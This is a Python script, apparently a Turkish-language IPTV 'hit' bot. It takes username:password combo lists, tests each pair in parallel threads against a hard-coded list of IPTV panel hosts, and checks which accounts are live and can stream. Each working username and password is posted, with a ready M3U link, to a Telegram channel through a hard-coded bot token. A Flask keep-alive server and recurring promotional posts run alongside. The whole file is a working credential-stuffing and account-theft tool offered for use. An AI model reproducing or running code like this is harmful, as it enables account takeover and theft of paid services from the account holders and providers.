# -*- coding: utf-8 -*-

import os
import time
import datetime
import requests
import threading
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from concurrent.futures import ThreadPoolExecutor, as_completed

# SSL uyarılarını kapat
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

from flask import Flask
app = Flask('')

@app.route('/')
def home():
    return "IPTV Çok Fonksiyonlu Bot Aktif ve Hızlı Modda Çalışıyor!"

TOKEN = "9296501081:AAG8COydawvxX-TfAEArbG-SdEtliP6WODM"
CHAT_ID = "-1004350622098"

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

def telegrama_gonder(mesaj):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        data = {"chat_id": CHAT_ID, "text": mesaj, "parse_mode": "HTML"}
        res = requests.post(url, data=data, timeout=10)
        if res.status_code != 200:
            print(f"[!] Telegram mesajı iletilemedi! Kod: {res.status_code}")
        else:
            print("[+] Telegram bildirimi başarıyla gönderildi.")
    except Exception as e:
        print(f"[!] Telegram bağlantı hatası: {e}")

# ==================== HER 30 DAKİKADA BİR ÇOK DİLLİ DUYURU ====================
def cok_dilli_post_gonderici():
    cok_dilli_mesaj = (
        "🌐 <b>GLOBAL M3U & MAC HUB — BILGILENDIRME</b>\n\n"
        "🇹🇷 <b>TR:</b> 7/24 güncel M3U & MAC verileri aktiftir. Bildirimleri açabilirsiniz.\n"
        "🇬🇧 <b>EN:</b> 24/7 live M3U & MAC updates active. Turn on notifications.\n"
        "🇩🇪 <b>DE:</b> 24/7 M3U & MAC Updates aktiv. Benachrichtigungen aktivieren.\n"
        "🇮🇹 <b>IT:</b> Aggiornamenti M3U e MAC 24/7 attivi. Attiva le notifiche.\n"
        "🇷🇺 <b>RU:</b> Круглосуточные обновления M3U и MAC активны. Включите уведомления.\n"
        "🇸🇦 <b>AR:</b> تحديثات M3U & MAC نشطة 24/7. قم بتفعيل الإشعارات.\n"
        "🇮🇳 <b>HI:</b> 24/7 लाइव म3ू और MAC अपडेट सक्रिय हैं। सूचनाएं चालू करें。\n\n"
        "🌐 <b>Global M3U & MAC Hub</b>"
    )
    
    time.sleep(20)
    
    while True:
        try:
            print("[i] 30 dakikalık çok dilli bilgilendirme mesajı gönderiliyor...")
            telegrama_gonder(cok_dilli_mesaj)
        except Exception as e:
            print(f"[!] Çok dilli post gönderim hatası: {e}")
            
        time.sleep(1800)
# ==============================================================================

HEADERd = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'Accept': '*/*',
    'Connection': 'Keep-Alive',
}

session = requests.Session()
adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50, max_retries=1)
session.mount('http://', adapter)
session.mount('https://', adapter)

def canli_yayin_test_et(panel, user, pas, stream_id):
    stream_url = f"http://{panel}/live/{user}/{pas}/{stream_id}.m3u8"
    try:
        res = session.get(stream_url, headers=HEADERd, timeout=4, verify=False, allow_redirects=True)
        if res.status_code == 200:
            content_type = res.headers.get('Content-Type', '')
            if 'video' in content_type or 'mpegurl' in content_type or len(res.content) > 50:
                return True
    except:
        pass
    return False

def m3u_tara_detayli(panel, user, pas):
    api_url = f"http://{panel}/player_api.php?username={user}&password={pas}"
    try:
        res = session.get(api_url, headers=HEADERd, timeout=(3, 5), verify=False)
        if res.status_code == 200 and 'user_info' in res.text:
            data = res.json()
            user_info = data.get('user_info', {})
            status = user_info.get('status', '')
            
            if status.lower() != 'active':
                return False

            print(f"[+] AKTİF HESAP BULUNDU! Panel: {panel} | User: {user}")
            
            acon = user_info.get('active_cons', '?')
            mcon = user_info.get('max_connections', '?')
            exp_timestamp = user_info.get('exp_date')
            
            if not exp_timestamp or exp_timestamp == 'null':
                bitis = 'Sınırsız'
            else:
                try:
                    bitis = datetime.datetime.fromtimestamp(int(exp_timestamp)).strftime('%Y-%m-%d %H:%M:%S')
                except:
                    bitis = 'Bilinmiyor'

            realm_info = data.get('server_info', {})
            realm = realm_info.get('url', panel)
            port = realm_info.get('port', '80')

            kanalsayisi, filmsayisi, dizisayisi = "0", "0", "0"
            first_stream_id = None
            
            try:
                k_res = session.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_live_streams", timeout=3, verify=False)
                if k_res.status_code == 200:
                    live_list = k_res.json()
                    kanalsayisi = str(len(live_list))
                    if isinstance(live_list, list) and len(live_list) > 0:
                        first_stream_id = live_list[0].get('stream_id')

                v_res = session.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_vod_streams", timeout=3, verify=False)
                if v_res.status_code == 200:
                    filmsayisi = str(len(v_res.json()))

                s_res = session.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_series", timeout=3, verify=False)
                if s_res.status_code == 200:
                    dizisayisi = str(len(s_res.json()))
            except:
                pass

            yayin_durumu = "🔴 Yayın Kesik / Çalışmıyor"
            if first_stream_id:
                if canli_yayin_test_et(panel, user, pas, first_stream_id):
                    yayin_durumu = "🟢 Çalışıyor (Doğrulandı)"

            # Ham link ve HTML için & işaretini &amp; yapıyoruz
            raw_m3ulink = f"http://{panel}/get.php?username={user}&password={pas}&type=m3u_plus"
            html_m3ulink = raw_m3ulink.replace('&', '&amp;')
            
            mesaj = (
                f"<b>🔥 YENİ IPTV HİT YAKALANDI! 🔥</b>\n"
                f"────────────────────────\n"
                f"🌐 <b>Host:</b> <code>{panel}</code>\n"
                f"🔗 <b>Real:</b> <code>{realm}:{port}</code>\n"
                f"────────────────────────\n"
                f"👤 <b>Kullanıcı:</b> <code>{user}</code>\n"
                f"🔑 <b>Şifre:</b> <code>{pas}</code>\n"
                f"📅 <b>Bitiş:</b> <code>{bitis}</code>\n"
                f"⚡ <b>Bağlantı:</b> <code>{acon} / {mcon}</code>\n"
                f"────────────────────────\n"
                f"📡 <b>Yayın Testi:</b> {yayin_durumu}\n"
                f"📊 <b>Durum:</b> <code>{status}</code>\n"
                f"🎬 <b>Kanal:</b> <code>{kanalsayisi}</code> | <b>Film:</b> <code>{filmsayisi}</code> | <b>Dizi:</b> <code>{dizisayisi}</code>\n"
                f"────────────────────────\n"
                f"🔗 <b>M3U Plus Link:</b>\n"
                f"<a href='{html_m3ulink}'>{raw_m3ulink}</a>"
            )
            
            telegrama_gonder(mesaj)
            return True
    except:
        pass
    return False

def arka_plan_tarayici():
    print("[*] Gelişmiş Çok Fonksiyonlu Tarayıcı Başlatıldı...")
    time.sleep(2)
    
    telegrama_gonder(
        "🚀 <b>STARTING</b>\n"
        "────────────────────────\n"
        "🌐 <b>Global M3U & MAC Hub</b>"
    )
    
    combo_dir = os.path.join(BASE_DIR, 'combo')
    panel_dir = os.path.join(BASE_DIR, 'panel_list')
    
    while True:
        try:
            paneller = []
            if os.path.exists(panel_dir):
                for p_dosya in os.listdir(panel_dir):
                    if p_dosya.endswith('.txt'):
                        p_yol = os.path.join(panel_dir, p_dosya)
                        with open(p_yol, 'r', encoding='utf-8', errors='ignore') as pf:
                            for line in pf:
                                line = line.strip()
                                if line and not line.startswith('#'):
                                    p_clean = line.replace('http://', '').replace('https://', '').split('/')[0].strip()
                                    if p_clean:
                                        paneller.append(p_clean)

            if not paneller:
                paneller = [
                    "darktv.eu:25461",
                    "playhdnew765.xyz:8080",
                    "germanyservers2.net:80",
                    "tgr2025.pro:8080",
                    "vipdeluxetv.trbluetv.xyz:2095",
                    "3b9r.7041635.xyz:80",
                    "ex.guteex.com:8000",
                    "saray68.darktv.nl:80",
                    "31.43.191.125:8080"
                ]

            print(f"[i] Toplam {len(paneller)} adet aktif panel yüklendi ve taranacak.")

            if os.path.exists(combo_dir):
                for dosya_adi in os.listdir(combo_dir):
                    if dosya_adi.endswith('.txt'):
                        dosya_yolu = os.path.join(combo_dir, dosya_adi)
                        print(f"\n[i] Taranan combo dosyası: {dosya_adi}")
                        
                        combolar = []
                        with open(dosya_yolu, 'r', encoding='utf-8', errors='ignore') as f:
                            for line in f:
                                line = line.strip()
                                if ':' in line:
                                    parts = line.split(':', 1)
                                    user = parts[0].strip()
                                    pas = parts[1].strip()
                                    if user and pas:
                                        combolar.append((user, pas))

                        print(f"[i] Toplam {len(combolar)} hesap, {len(paneller)} farklı panel ile çapraz taranıyor...")

                        chunk_size = 1000
                        toplam_chunk = (len(combolar) + chunk_size - 1) // chunk_size
                        
                        for idx, i in enumerate(range(0, len(combolar), chunk_size), 1):
                            chunk = combolar[i:i + chunk_size]
                            print(f"[i] İşleniyor: Chunk {idx}/{toplam_chunk} ({len(chunk)} hesap x {len(paneller)} panel)...")
                            
                            with ThreadPoolExecutor(max_workers=20) as executor:
                                futures = [
                                    executor.submit(m3u_tara_detayli, panel, user, pas)
                                    for user, pas in chunk
                                    for panel in paneller
                                ]
                                for future in as_completed(futures):
                                    pass
                            
                            time.sleep(0.5)
        
            print("\n[i] Tarama turu tamamlandı, 10 dakika sonra tekrar dönecek...")
            
            telegrama_gonder(
                "✅ <b>FINISHED</b>\n"
                "────────────────────────\n"
                "🌐 <b>Global M3U & MAC Hub</b>"
            )
            
            telegrama_gonder(
                "⏳ <b>WAITING</b>\n"
                "────────────────────────\n"
                "🌐 <b>Global M3U & MAC Hub</b>"
            )
            
            time.sleep(600)
        except Exception as e:
            print(f"[!] Tarama döngüsü hatası: {e}")
            telegrama_gonder(f"⚠️ <b>SİSTEM UYARISI: Döngüde Hata!</b>\n<code>{e}</code>")
            time.sleep(30)

if __name__ == '__main__':
    t1 = threading.Thread(target=arka_plan_tarayici)
    t1.daemon = True
    t1.start()
    
    t2 = threading.Thread(target=cok_dilli_post_gonderici)
    t2.daemon = True
    t2.start()
    
    print("[*] Flask Web Sunucusu Başlatılıyor...")
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))